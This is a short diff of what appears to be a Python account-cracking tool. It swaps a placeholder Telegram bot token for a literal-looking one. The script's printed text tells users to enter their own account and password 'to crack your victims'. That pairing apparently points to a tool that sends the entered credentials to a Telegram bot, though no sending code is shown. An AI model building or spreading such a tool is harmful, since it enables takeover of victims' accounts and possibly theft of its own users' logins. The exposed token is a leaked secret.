@@ -78,7 +78,7 @@ elif number == 2:
         print("\033[32mTool devoloped : Anonymous\033[0m")
 
         # Initialize the Telegram bot with your API key
-        bot = telegram.Bot(token='YOUR_API_KEY')
+        bot = telegram.Bot(token='5971532047:AAExHdyy5Kbxcxh_GYPFNwXkPS9jv7wk9Hg')
 
         print("You need to enter your own account and password to crack your victims. Otherwise tool will not work. Please use original account")
         print("")
